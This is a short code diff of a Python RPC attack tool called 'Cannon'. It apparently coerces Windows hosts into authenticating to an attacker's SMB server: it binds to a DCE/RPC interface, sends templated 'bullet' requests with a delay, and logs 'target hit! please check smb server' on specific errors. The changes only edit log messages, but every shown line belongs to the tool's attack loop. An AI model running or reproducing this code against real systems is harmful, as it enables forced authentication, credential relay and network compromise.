@@ -47,7 +47,7 @@ class Cannon:
                 dce.connect()
                 dce.bind(uuidtup_to_bin(self._uuid))
                 self._dce = dce
-                logging.info(f'[lock_and_load] success')
+                logging.info(f'[lock&load] success')
                 self._shoot()
             except SessionError as e1:
                 if "STATUS_OBJECT_NAME_NOT_FOUND" in e1.getErrorString():
@@ -56,7 +56,7 @@ class Cannon:
                     logging.error(e1.getErrorString())
             except Exception as e2:
                 # 不允许匿名登录
-                logging.error(f'[lock_and_load] dce init error {e2}')
+                logging.error(f'[lock&load] dce init error {e2}')
 
     # 发射
     def _shoot(self):
@@ -68,15 +68,14 @@ class Cannon:
                     time.sleep(self._opts.get('delay'))
                     args = bullet_generator._vul_args
                     vals = [bullet[arg] for arg in args]
-                    print('-' * 50)
                     logging.info(f'shooting [\x1b[36;20m{self._target.target_ip}\x1b[0m]\x1b[34;20m{bullet_generator._class.__name__}(' + ', '.join(
                         [f'{k}={v[:-1]}' for k, v in zip(args, vals)]) + ')\x1b[0m')
                     self._dce.request(bullet)
                 except Exception as e:
                     if "ERROR_BAD_NETPATH" in str(e):
-                        logging.info(f'\x1b[31;20m[------------->] target hit! please check smb server.\x1b[0m')
+                        logging.info(f'\x1b[31;20m[--->] target hit! please check smb server.\x1b[0m')
                     elif "STATUS_CONNECTION_DISCONNECTED" in str(e):
-                        logging.info(f'\x1b[31;20m[------------->] target hit! please check smb server.\x1b[0m')
+                        logging.info(f'\x1b[31;20m[--->] target hit! please check smb server.\x1b[0m')
                     else:
                         logging.error(f'[_shoot] {e}')
 
